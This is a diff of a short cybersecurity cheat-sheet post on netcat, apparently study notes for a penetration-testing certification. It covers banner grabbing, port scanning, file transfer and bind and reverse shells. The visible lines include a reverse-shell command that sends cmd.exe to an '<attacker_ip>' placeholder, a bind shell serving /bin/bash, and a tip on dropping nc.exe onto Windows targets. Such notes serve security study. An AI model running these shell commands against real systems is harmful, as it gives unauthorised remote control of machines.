@@ -1,7 +1,7 @@
 ---
 title: "Netcat: the TCP/IP swiss-army knife"
-description: "Banner grabbing, port scanning, file transfer, and bind/reverse shells with one tiny tool."
-pubDate: 2026-08-01
+description: "Banner grabbing, port scanning, file transfer, and bind/reverse shells."
+pubDate: 2026-11-11
 category: "Cybersecurity"
 source: "INE Certification"
 lang: "bash"
@@ -9,7 +9,7 @@ tags: ["netcat", "shells"]
 draft: false
 ---
 
-Netcat reads and writes raw TCP/UDP connections, which makes it useful for far more than its "just a chat tool" reputation suggests — banner grabbing, quick port checks, moving files without standing up a whole server, and both ends of a bind or reverse shell.
+Netcat reads and writes raw TCP/UDP connections making it able to perform banner grabbing, quick port checks, moving files and handle both ends of a bind or reverse shell.
 
 ```bash
 # Connect / banner grab
@@ -30,4 +30,4 @@ nc -nvlp <port> -c /bin/bash         # Linux target (-c is the Linux-only equiva
 nc -nv <attacker_ip> <port> -e cmd.exe
 ```
 
-`-z` turns netcat into a bare-bones port scanner (`nc -zv <target> <port-range>`, zero-I/O mode). Kali keeps a portable `nc.exe` under `/usr/share/windows-binaries` for when you need to drop it onto a Windows target. `-e`/`-c` are flagged "dangerous" in netcat's own help text for good reason — they're exactly the functionality that makes bind/reverse shells possible, so treat any box with an exec-capable netcat installed as a soft target.
+`-z` turns netcat into a bare-bones port scanner (`nc -zv <target> <port-range>`). Kali keeps a portable `nc.exe` under `/usr/share/windows-binaries` for when you need to drop it onto a Windows target. `-e`/`-c` are the options that make bind/reverse shells possible, so treat any box with an exec-capable netcat installed as a soft target.
